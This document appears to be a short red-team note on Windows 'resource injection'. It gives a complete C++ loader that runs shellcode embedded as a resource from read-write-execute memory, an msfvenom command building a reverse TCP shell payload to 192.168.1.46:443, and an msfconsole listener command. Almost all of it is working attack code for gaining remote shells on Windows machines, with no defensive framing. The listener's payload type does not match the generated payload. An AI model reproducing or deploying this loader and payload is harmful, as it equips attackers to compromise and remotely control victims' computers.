# Resource-injection

 generate a  shellcode in binary format first and Embedding The Shellcode as a Resource

##### Resource-injection.cpp

```cpp
#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
    // IDR_NOORANET_BIN1 - is the resource ID - which contains ths shellcode
    // NOORANET_BIN is the resource type name we chose earlier when embedding the shell.bin
    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_NOORANET_BIN1), L"NOORANET_BIN");
    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

    void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcodeResouceData, shellcodeSize);
    ((void(*)())exec)();

    return  0;
}
```

* `Tip` 
  Right click on the Resource Files in Solution Explorer and select Add > Resource
  Click Import and select the resource you want to include. In my case - it's the shell.bin
  Give resource a resource type name : NOORANET_BIN

### Payload - shell.bin

    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.46 LPORT=443 > shell.bin

### Listener

```bash
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```
